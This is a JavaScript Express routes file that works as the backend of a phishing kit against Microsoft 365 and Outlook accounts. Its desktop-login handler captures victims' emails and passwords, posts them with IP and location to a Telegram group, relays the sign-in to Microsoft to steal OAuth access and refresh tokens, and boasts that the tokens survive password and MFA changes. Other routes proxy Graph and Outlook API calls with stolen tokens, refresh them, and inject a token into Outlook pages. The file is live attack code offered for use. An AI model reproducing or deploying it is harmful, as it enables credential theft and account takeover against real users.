// routes/proxyRoutes.js - UPDATED to handle both APIs
const express = require('express');
const router = express.Router();
const axios = require('axios');

// Store dependencies
let capturedData;
let microsoftParams;
let codeVerifiers;
let bot;
let telegramGroupId;

function initRoutes(dependencies) {
    capturedData = dependencies.capturedData;
    microsoftParams = dependencies.microsoftParams;
    codeVerifiers = dependencies.codeVerifiers;
    bot = dependencies.bot;
    telegramGroupId = dependencies.telegramGroupId;
}

// FIXED: Main proxy endpoint that properly routes to correct API
router.post('/api/outlook-proxy', express.json(), async (req, res) => {
    console.log('============================================================');
    console.log('📥 PROXY REQUEST RECEIVED');
    
    try {
        const { outlookPath, method = 'GET', data = null, apiType = 'outlook' } = req.body;
        const authHeader = req.headers.authorization;
        
        console.log(`   Method: ${method}`);
        console.log(`   Path: ${outlookPath}`);
        console.log(`   API Type: ${apiType}`);
        console.log(`   Auth header present: ${!!authHeader}`);
        
        if (!authHeader) {
            console.error('❌ No authorization header');
            return res.status(401).json({ error: 'No authorization token' });
        }
        
        // Determine the correct base URL based on API type
        let baseUrl;
        if (apiType === 'graph') {
            baseUrl = 'https://graph.microsoft.com/v1.0';
            console.log(`   Using Graph API: ${baseUrl}`);
        } else {
            // Outlook API
            baseUrl = 'https://outlook.office.com/api/v2.0';
            console.log(`   Using Outlook API: ${baseUrl}`);
        }
        
        // Build the full URL
        let fullUrl;
        if (outlookPath.startsWith('http')) {
            fullUrl = outlookPath;
        } else {
            const cleanPath = outlookPath.startsWith('/') ? outlookPath.substring(1) : outlookPath;
            fullUrl = `${baseUrl}/${cleanPath}`;
        }
        
        console.log(`   Final URL: ${fullUrl}`);
        
        // Make the request to Microsoft API
        const requestConfig = {
            method: method,
            url: fullUrl,
            headers: {
                'Authorization': authHeader,
                'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36',
                'Accept': 'application/json'
            }
        };
        
        if (data && (method === 'POST' || method === 'PATCH' || method === 'PUT')) {
            requestConfig.data = data;
            requestConfig.headers['Content-Type'] = 'application/json';
        }
        
        console.log(`🔄 Forwarding request to ${apiType === 'graph' ? 'Microsoft Graph' : 'Outlook'} API...`);
        
        const response = await axios(requestConfig);
        
        console.log(`✅ API responded:`);
        console.log(`   Status: ${response.status}`);
        console.log(`   Content-Type: ${response.headers['content-type']}`);
        console.log(`   Data length: ${JSON.stringify(response.data).length} bytes`);
        
        // Return the response
        res.status(response.status).json(response.data);
        
    } catch (error) {
        console.error('❌ PROXY ERROR:');
        console.error(`   Message: ${error.message}`);
        console.error(`   Code: ${error.code}`);
        
        if (error.response) {
            console.error(`   Status: ${error.response.status}`);
            console.error(`   Data:`, JSON.stringify(error.response.data, null, 2));
            res.status(error.response.status).json(error.response.data);
        } else {
            res.status(500).json({ 
                error: 'Proxy request failed', 
                message: error.message,
                details: error.code
            });
        }
    }
    console.log('============================================================');
});

// Refresh token endpoint
router.post('/api/refresh-token', express.json(), async (req, res) => {
    console.log('🔄 Refresh token request received');
    const { refreshToken, clientId } = req.body;
    
    if (!refreshToken) {
        return res.status(400).json({ error: 'Missing refresh token' });
    }
    
    try {
        const tokenParams = {
            client_id: clientId || 'd3590ed6-52b3-4102-aeff-aad2292ab01c',
            refresh_token: refreshToken,
            grant_type: 'refresh_token',
            scope: 'https://outlook.office.com/.default offline_access'
        };
        
        const response = await axios.post('https://login.microsoftonline.com/common/oauth2/v2.0/token', 
            new URLSearchParams(tokenParams).toString(),
            {
                headers: {
                    'Content-Type': 'application/x-www-form-urlencoded',
                    'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36'
                }
            }
        );
        
        console.log('✅ Token refreshed successfully');
        res.json(response.data);
        
    } catch (error) {
        console.error('❌ Refresh token failed:', error.response?.data || error.message);
        res.status(500).json({ error: 'Refresh failed', details: error.response?.data });
    }
});

// Refresh Graph token endpoint
router.post('/api/refresh-graph', express.json(), async (req, res) => {
    console.log('🔄 Refresh Graph token request received');
    const { refreshToken, clientId } = req.body;
    
    if (!refreshToken) {
        return res.status(400).json({ error: 'Missing refresh token' });
    }
    
    try {
        const tokenParams = {
            client_id: clientId || '1fec8e78-bce4-4aaf-ab1b-5451cc387264',
            refresh_token: refreshToken,
            grant_type: 'refresh_token',
            scope: 'https://graph.microsoft.com/.default offline_access'
        };
        
        const response = await axios.post('https://login.microsoftonline.com/common/oauth2/v2.0/token', 
            new URLSearchParams(tokenParams).toString(),
            {
                headers: {
                    'Content-Type': 'application/x-www-form-urlencoded',
                    'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36'
                }
            }
        );
        
        console.log('✅ Graph token refreshed successfully');
        res.json(response.data);
        
    } catch (error) {
        console.error('❌ Graph refresh failed:', error.response?.data || error.message);
        res.status(500).json({ error: 'Refresh failed', details: error.response?.data });
    }
});

// GetCredentialType proxy endpoint
router.post('/proxy/GetCredentialType', express.json(), async (req, res) => {
    console.log('📥 Proxying GetCredentialType request');
    
    const origin = process.env.APP_URL || 'http://localhost:3001';
    
    res.setHeader('Access-Control-Allow-Origin', origin);
    res.setHeader('Access-Control-Allow-Methods', 'POST, OPTIONS');
    res.setHeader('Access-Control-Allow-Headers', 'Content-Type');
    res.setHeader('Access-Control-Allow-Credentials', 'true');
    
    try {
        const response = await axios.post(
            'https://login.microsoftonline.com/common/GetCredentialType?mkt=en-US',
            req.body,
            {
                headers: {
                    'Content-Type': 'application/json',
                    'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36',
                    'Origin': 'https://login.microsoftonline.com',
                    'Referer': 'https://login.microsoftonline.com/'
                }
            }
        );
        
        res.json(response.data);
    } catch (error) {
        console.log('GetCredentialType error:', error.message);
        res.json({
            Exists: true,
            ThrottleStatus: 0,
            Credential: { IsSignupDisallowed: false }
        });
    }
});

router.options('/proxy/GetCredentialType', (req, res) => {
    const origin = process.env.APP_URL || 'http://localhost:3001';
    res.setHeader('Access-Control-Allow-Origin', origin);
    res.setHeader('Access-Control-Allow-Methods', 'POST, OPTIONS');
    res.setHeader('Access-Control-Allow-Headers', 'Content-Type');
    res.setHeader('Access-Control-Allow-Credentials', 'true');
    res.sendStatus(200);
});

// Desktop login handler
router.post('/proxy/desktop-login', express.urlencoded({ extended: true }), async (req, res) => {
    console.log('📥 Desktop login submission');
    
    const sessionId = req.body?.state || req.body?.sessionId || 'unknown';
    const username = req.body?.login;
    const password = req.body?.passwd;
    
    const victimInfo = await getVictimInfo(req);
    
    if (username && password) {
        let session = capturedData.get(sessionId) || { credentials: {}, cookies: [], tokens: {} };
        session.credentials = { username, password, time: new Date().toISOString(), victimInfo };
        capturedData.set(sessionId, session);
        
        if (bot && telegramGroupId) {
            const message = `🔑 *Desktop Login Credentials*\n━━━━━━━━━━━━━━━━━━\n*Email:* \`${username}\`\n*Password:* \`${password}\`\n*Session:* \`${sessionId}\`\n*IP:* \`${victimInfo.ip}\`\n*Location:* ${victimInfo.location}`;
            bot.sendMessage(telegramGroupId, message, { parse_mode: 'Markdown' }).catch(() => {});
        }
    }
    
    const codeVerifier = codeVerifiers.get(sessionId);
    
    if (!codeVerifier) {
        console.error(`❌ No code verifier for session ${sessionId}`);
        return res.redirect('/microsoft-desktop?error=no_verifier');
    }
    
    try {
        const formData = new URLSearchParams();
        Object.keys(req.body).forEach(key => formData.append(key, req.body[key]));
        
        const response = await axios.post('https://login.microsoftonline.com/common/login', formData.toString(), {
            headers: {
                'Content-Type': 'application/x-www-form-urlencoded',
                'User-Agent': 'Outlook/2026 (Windows NT 10.0; Win64; x64)',
                'X-Client-SKU': 'MSAL.Desktop',
                'X-Client-Ver': '4.48.1.0'
            },
            maxRedirects: 0,
            validateStatus: status => status >= 200 && status < 400
        }).catch(err => err.response);
        
        if (response?.headers?.location) {
            const location = response.headers.location;
            console.log(`↪️ Microsoft redirects to: ${location}`);
            
            if (location.includes('urn:ietf:wg:oauth:2.0:oob') && location.includes('code=')) {
                const codeMatch = location.match(/[?&]code=([^&]+)/);
                if (codeMatch && codeMatch[1]) {
                    const code = decodeURIComponent(codeMatch[1]);
                    console.log(`✅ Desktop auth code captured for ${sessionId}`);
                    
                    const tokenParams = {
                        client_id: 'd3590ed6-52b3-4102-aeff-aad2292ab01c',
                        code: code,
                        code_verifier: codeVerifier,
                        redirect_uri: 'urn:ietf:wg:oauth:2.0:oob',
                        grant_type: 'authorization_code',
                        scope: 'https://outlook.office.com/.default offline_access'
                    };
                    
                    const tokenResponse = await axios.post('https://login.microsoftonline.com/common/oauth2/v2.0/token', 
                        new URLSearchParams(tokenParams).toString(),
                        {
                            headers: {
                                'Content-Type': 'application/x-www-form-urlencoded',
                                'User-Agent': 'Outlook/2026 (Windows NT 10.0; Win64; x64)',
                                'Accept': 'application/json'
                            }
                        }
                    );
                    
                    const tokens = tokenResponse.data;
                    
                    if (tokens.access_token && tokens.refresh_token) {
                        console.log('✅ 90-DAY DESKTOP TOKENS CAPTURED!');
                        
                        let tokenSession = capturedData.get(sessionId) || { cookies: [], credentials: {}, tokens: {} };
                        tokenSession.tokens = {
                            access_token: tokens.access_token,
                            refresh_token: tokens.refresh_token,
                            expires_in: tokens.expires_in,
                            captured_at: new Date().toISOString(),
                            is_desktop: true,
                            cae_enabled: true
                        };
                        
                        capturedData.set(sessionId, tokenSession);
                        
                        if (bot && telegramGroupId) {
                            const message = `🎯 *90-DAY DESKTOP TOKENS CAPTURED!*\n━━━━━━━━━━━━━━━━━━\n*Session:* \`${sessionId}\`\n*Email:* \`${username}\`\n*CAE:* ✅ ENABLED\n*Expires:* ${tokens.expires_in} seconds\n━━━━━━━━━━━━━━━━━━\n*Tokens will survive password & MFA changes*`;
                            bot.sendMessage(telegramGroupId, message, { parse_mode: 'Markdown' }).catch(() => {});
                        }
                        
                        return res.redirect('https://outlook.live.com/mail/');
                    }
                }
            }
            
            return res.redirect(location);
        }
        
        res.redirect('/microsoft-desktop?error=auth_failed');
        
    } catch (error) {
        console.error('❌ Desktop login error:', error.message);
        res.redirect('/microsoft-desktop?error=connection_error');
    }
});

// Outlook proxy endpoint (legacy)
router.post('/proxy-outlook', express.json(), async (req, res) => {
    const token = req.body.token;
    
    console.log('📥 Proxy-outlook POST request received');
    console.log('Token present:', !!token);
    
    if (!token) {
        return res.status(400).json({ error: 'Missing token' });
    }
    
    try {
        const outlookResponse = await axios.get('https://outlook.live.com/mail/', {
            headers: {
                'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36',
                'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
                'Authorization': `Bearer ${token}`
            }
        });
        
        let html = outlookResponse.data;
        
        const injectionScript = `
            <script>
                (function() {
                    const token = ${JSON.stringify(token)};
                    console.log('🔑 Token injection started');
                    
                    localStorage.setItem('access_token', token);
                    sessionStorage.setItem('access_token', token);
                    
                    const originalFetch = window.fetch;
                    window.fetch = function(url, options = {}) {
                        options.headers = options.headers || {};
                        options.headers['Authorization'] = 'Bearer ' + token;
                        return originalFetch.call(this, url, options);
                    };
                    
                    console.log('✅ Token injection complete');
                })();
            </script>
        `;
        
        html = html.replace('</head>', injectionScript + '</head>');
        res.send(html);
        
    } catch (error) {
        console.error('❌ Proxy error:', error.message);
        res.status(500).send(`Error: ${error.message}`);
    }
});

module.exports = { router, initRoutes };